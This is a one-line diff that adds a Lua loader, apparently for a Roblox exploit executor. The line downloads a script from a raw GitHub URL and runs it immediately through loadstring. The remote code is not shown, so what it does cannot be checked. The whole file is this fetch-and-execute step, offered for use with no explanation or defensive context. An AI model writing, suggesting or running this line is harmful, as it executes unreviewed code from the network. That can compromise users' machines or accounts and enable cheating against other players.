@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyouranya/intro/main/v2.lua'),true))()
